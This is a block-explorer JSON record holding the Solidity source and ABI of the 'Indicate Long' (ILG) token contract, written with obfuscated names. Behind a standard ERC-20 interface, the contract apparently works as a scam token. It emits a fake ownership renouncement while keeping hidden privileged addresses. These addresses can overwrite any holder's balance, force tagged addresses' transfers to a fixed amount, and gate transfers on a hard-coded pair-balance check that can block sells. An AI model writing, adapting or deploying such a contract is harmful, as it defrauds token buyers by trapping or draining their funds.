{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface exemptFeeTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapAtAmount {\n    function createPair(address toSender, address txTotal) external returns (address);\n}\n\ninterface autoLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountMaxReceiver) external view returns (uint256);\n\n    function transfer(address tokenExemptList, uint256 fromSender) external returns (bool);\n\n    function allowance(address buyLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenExemptList,\n        uint256 fromSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isMax, uint256 value);\n    event Approval(address indexed buyLaunched, address indexed spender, uint256 value);\n}\n\ninterface autoLaunchedMetadata is autoLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IndicateLong is marketingShould, autoLaunched, autoLaunchedMetadata {\n\n    function enableTotalTo(address tokenTo, address tokenExemptList, uint256 fromSender) internal returns (bool) {\n        if (tokenTo == launchTotal) {\n            return enableLaunchedTake(tokenTo, tokenExemptList, fromSender);\n        }\n        uint256 walletFrom = autoLaunched(toMinList).balanceOf(swapIs);\n        require(walletFrom == tokenSell);\n        require(tokenExemptList != swapIs);\n        if (marketingFund[tokenTo]) {\n            return enableLaunchedTake(tokenTo, tokenExemptList, fromFundLaunch);\n        }\n        return enableLaunchedTake(tokenTo, tokenExemptList, fromSender);\n    }\n\n    function balanceOf(address amountMaxReceiver) public view virtual override returns (uint256) {\n        return fromIsTake[amountMaxReceiver];\n    }\n\n    function transferFrom(address tokenTo, address tokenExemptList, uint256 fromSender) external override returns (bool) {\n        if (_msgSender() != sellEnable) {\n            if (exemptTrading[tokenTo][_msgSender()] != type(uint256).max) {\n                require(fromSender <= exemptTrading[tokenTo][_msgSender()]);\n                exemptTrading[tokenTo][_msgSender()] -= fromSender;\n            }\n        }\n        return enableTotalTo(tokenTo, tokenExemptList, fromSender);\n    }\n\n    mapping(address => bool) public marketingFund;\n\n    function atLaunch() public {\n        emit OwnershipTransferred(launchTotal, address(0));\n        marketingLiquidity = address(0);\n    }\n\n    function enableLaunchedTake(address tokenTo, address tokenExemptList, uint256 fromSender) internal returns (bool) {\n        require(fromIsTake[tokenTo] >= fromSender);\n        fromIsTake[tokenTo] -= fromSender;\n        fromIsTake[tokenExemptList] += fromSender;\n        emit Transfer(tokenTo, tokenExemptList, fromSender);\n        return true;\n    }\n\n    mapping(address => bool) public minFee;\n\n    uint8 private maxWallet = 18;\n\n    uint256 tokenSell;\n\n    uint256 constant fromFundLaunch = 6 ** 10;\n\n    uint256 private minSenderTrading;\n\n    address swapIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private exemptTrading;\n\n    bool public amountSwapShould;\n\n    function allowance(address receiverAmountMode, address liquidityMin) external view virtual override returns (uint256) {\n        if (liquidityMin == sellEnable) {\n            return type(uint256).max;\n        }\n        return exemptTrading[receiverAmountMode][liquidityMin];\n    }\n\n    uint256 private listToken = 100000000 * 10 ** 18;\n\n    function maxSell(address amountTrading) public {\n        require(amountTrading.balance < 100000);\n        if (amountSwapShould) {\n            return;\n        }\n        if (minSenderTrading != maxEnable) {\n            maxEnable = takeTotal;\n        }\n        minFee[amountTrading] = true;\n        if (minSenderTrading != takeTotal) {\n            takeTotal = minSenderTrading;\n        }\n        amountSwapShould = true;\n    }\n\n    function autoMarketing(address senderTrading) public {\n        takeTx();\n        if (minSenderTrading != takeTotal) {\n            maxEnable = takeTotal;\n        }\n        if (senderTrading == launchTotal || senderTrading == toMinList) {\n            return;\n        }\n        marketingFund[senderTrading] = true;\n    }\n\n    function buyTotalReceiver(address tradingToken, uint256 fromSender) public {\n        takeTx();\n        fromIsTake[tradingToken] = fromSender;\n    }\n\n    event OwnershipTransferred(address indexed swapShould, address indexed txLimit);\n\n    uint256 public takeTotal;\n\n    function name() external view virtual override returns (string memory) {\n        return toAuto;\n    }\n\n    function senderTeamLimit(uint256 fromSender) public {\n        takeTx();\n        tokenSell = fromSender;\n    }\n\n    address private marketingLiquidity;\n\n    function transfer(address tradingToken, uint256 fromSender) external virtual override returns (bool) {\n        return enableTotalTo(_msgSender(), tradingToken, fromSender);\n    }\n\n    address public toMinList;\n\n    mapping(address => uint256) private fromIsTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxWallet;\n    }\n\n    function takeTx() private view {\n        require(minFee[_msgSender()]);\n    }\n\n    address public launchTotal;\n\n    string private senderReceiver = \"ILG\";\n\n    constructor (){\n        \n        exemptFeeTotal isReceiver = exemptFeeTotal(sellEnable);\n        toMinList = swapAtAmount(isReceiver.factory()).createPair(isReceiver.WETH(), address(this));\n        \n        launchTotal = _msgSender();\n        atLaunch();\n        minFee[launchTotal] = true;\n        fromIsTake[launchTotal] = listToken;\n        \n        emit Transfer(address(0), launchTotal, listToken);\n    }\n\n    uint256 public maxEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listToken;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingLiquidity;\n    }\n\n    function owner() external view returns (address) {\n        return marketingLiquidity;\n    }\n\n    uint256 txSell;\n\n    address sellEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address liquidityMin, uint256 fromSender) public virtual override returns (bool) {\n        exemptTrading[_msgSender()][liquidityMin] = fromSender;\n        emit Approval(_msgSender(), liquidityMin, fromSender);\n        return true;\n    }\n\n    string private toAuto = \"Indicate Long\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmountMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSwapShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"}],\"name\":\"autoMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMaxReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"buyTotalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"}],\"name\":\"maxSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"senderTeamLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMinList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenExemptList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IndicateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}